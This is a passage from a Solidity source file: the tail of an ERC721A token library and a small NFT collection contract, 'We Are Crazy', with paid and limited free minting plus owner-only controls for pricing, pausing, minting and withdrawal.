1084         // Overflows are incredibly unrealistic.
1085         // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1
1086         // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1
1087         unchecked {
1088             _addressData[to].balance += uint128(quantity);
1089             _addressData[to].numberMinted += uint128(quantity);
1090 
1091             _ownerships[startTokenId].addr = to;
1092             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1093 
1094             uint256 updatedIndex = startTokenId;
1095 
1096             for (uint256 i; i < quantity; i++) {
1097                 emit Transfer(address(0), to, updatedIndex);
1098                 if (safe) {
1099                     require(
1100                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
1101                         "ERC721A: transfer to non ERC721Receiver implementer"
1102                     );
1103                 }
1104 
1105                 updatedIndex++;
1106             }
1107 
1108             currentIndex = updatedIndex;
1109         }
1110 
1111         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1112     }
1113 
1114     /**
1115      * @dev Transfers `tokenId` from `from` to `to`.
1116      *
1117      * Requirements:
1118      *
1119      * - `to` cannot be the zero address.
1120      * - `tokenId` token must be owned by `from`.
1121      *
1122      * Emits a {Transfer} event.
1123      */
1124     function _transfer(
1125         address from,
1126         address to,
1127         uint256 tokenId
1128     ) private {
1129         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1130 
1131         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1132             getApproved(tokenId) == _msgSender() ||
1133             isApprovedForAll(prevOwnership.addr, _msgSender()));
1134 
1135         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
1136 
1137         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
1138         require(to != address(0), "ERC721A: transfer to the zero address");
1139 
1140         _beforeTokenTransfers(from, to, tokenId, 1);
1141 
1142         // Clear approvals from the previous owner
1143         _approve(address(0), tokenId, prevOwnership.addr);
1144 
1145         // Underflow of the sender's balance is impossible because we check for
1146         // ownership above and the recipient's balance can't realistically overflow.
1147         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1148         unchecked {
1149             _addressData[from].balance -= 1;
1150             _addressData[to].balance += 1;
1151 
1152             _ownerships[tokenId].addr = to;
1153             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1154 
1155             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1156             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1157             uint256 nextTokenId = tokenId + 1;
1158             if (_ownerships[nextTokenId].addr == address(0)) {
1159                 if (_exists(nextTokenId)) {
1160                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1161                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1162                 }
1163             }
1164         }
1165 
1166         emit Transfer(from, to, tokenId);
1167         _afterTokenTransfers(from, to, tokenId, 1);
1168     }
1169 
1170     /**
1171      * @dev Approve `to` to operate on `tokenId`
1172      *
1173      * Emits a {Approval} event.
1174      */
1175     function _approve(
1176         address to,
1177         uint256 tokenId,
1178         address owner
1179     ) private {
1180         _tokenApprovals[tokenId] = to;
1181         emit Approval(owner, to, tokenId);
1182     }
1183 
1184     /**
1185      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
1186      * The call is not executed if the target address is not a contract.
1187      *
1188      * @param from address representing the previous owner of the given token ID
1189      * @param to target address that will receive the tokens
1190      * @param tokenId uint256 ID of the token to be transferred
1191      * @param _data bytes optional data to send along with the call
1192      * @return bool whether the call correctly returned the expected magic value
1193      */
1194     function _checkOnERC721Received(
1195         address from,
1196         address to,
1197         uint256 tokenId,
1198         bytes memory _data
1199     ) private returns (bool) {
1200         if (to.isContract()) {
1201             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1202                 return retval == IERC721Receiver(to).onERC721Received.selector;
1203             } catch (bytes memory reason) {
1204                 if (reason.length == 0) {
1205                     revert("ERC721A: transfer to non ERC721Receiver implementer");
1206                 } else {
1207                     assembly {
1208                         revert(add(32, reason), mload(reason))
1209                     }
1210                 }
1211             }
1212         } else {
1213             return true;
1214         }
1215     }
1216 
1217     /**
1218      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1219      *
1220      * startTokenId - the first token id to be transferred
1221      * quantity - the amount to be transferred
1222      *
1223      * Calling conditions:
1224      *
1225      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
1226      * transferred to `to`.
1227      * - When `from` is zero, `tokenId` will be minted for `to`.
1228      */
1229     function _beforeTokenTransfers(
1230         address from,
1231         address to,
1232         uint256 startTokenId,
1233         uint256 quantity
1234     ) internal virtual {}
1235 
1236     /**
1237      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1238      * minting.
1239      *
1240      * startTokenId - the first token id to be transferred
1241      * quantity - the amount to be transferred
1242      *
1243      * Calling conditions:
1244      *
1245      * - when `from` and `to` are both non-zero.
1246      * - `from` and `to` are never both zero.
1247      */
1248     function _afterTokenTransfers(
1249         address from,
1250         address to,
1251         uint256 startTokenId,
1252         uint256 quantity
1253     ) internal virtual {}
1254 }
1255 
1256 contract WC is ERC721A, Ownable, ReentrancyGuard {
1257     string public baseURI = "ipfs://QmXEZPdv6A3jKWT1oj8DatkyWSP76XSubA4RQ7MikuTZ8u";
1258     uint   public price             = 0.003 ether;
1259     uint   public maxPerTx          = 10;
1260     uint   public maxPerFree        = 1;
1261     uint   public totalFree         = 888;
1262     uint   public maxSupply         = 2200;
1263     bool   public paused            = false;
1264 
1265     mapping(address => uint256) private _mintedFreeAmount;
1266 
1267     constructor() ERC721A("We Are Crazy", "WC"){}
1268 
1269     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
1270         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
1271         string memory currentBaseURI = _baseURI();
1272         return bytes(currentBaseURI).length > 0
1273             ? string(abi.encodePacked(currentBaseURI,Strings.toString(_tokenId+1),".json"))
1274             : "";
1275     }
1276 
1277     function mint(uint256 count) external payable {
1278         uint256 cost = price;
1279         bool isFree = ((totalSupply() + count < totalFree + 1) &&
1280             (_mintedFreeAmount[msg.sender] < maxPerFree));
1281 
1282         if (isFree) {
1283             require(!paused, "The contract is paused!");
1284             require(msg.value >= (count * cost) - cost, "INVALID_ETH");
1285             require(totalSupply() + count <= maxSupply, "No more.");
1286             require(count <= maxPerTx, "Max per TX reached.");
1287             _mintedFreeAmount[msg.sender] += count;
1288         }
1289         else{
1290         require(!paused, "The contract is paused!");
1291         require(msg.value >= count * cost, "Send the exact amount: 0.003*(count)");
1292         require(totalSupply() + count <= maxSupply, "No more.");
1293         require(count <= maxPerTx, "Max per TX reached.");
1294         }
1295 
1296         _safeMint(msg.sender, count);
1297     }
1298 
1299     function Master(address mintAddress, uint256 count) public onlyOwner {
1300         _safeMint(mintAddress, count);
1301     }
1302 
1303     function setPaused(bool _state) public onlyOwner {
1304     paused = _state;
1305     }
1306 
1307     function _baseURI() internal view virtual override returns (string memory) {
1308         return baseURI;
1309     }
1310 
1311     function setBaseUri(string memory baseuri_) public onlyOwner {
1312         baseURI = baseuri_;
1313     }
1314 
1315     function setPrice(uint256 price_) external onlyOwner {
1316         price = price_;
1317     }
1318 
1319     function setMaxTotalFree(uint256 MaxTotalFree_) external onlyOwner {
1320         totalFree = MaxTotalFree_;
1321     }
1322 
1323     function withdraw() external onlyOwner nonReentrant {
1324         (bool success, ) = msg.sender.call{value: address(this).balance}("");
1325         require(success, "Transfer failed.");
1326     }
1327 }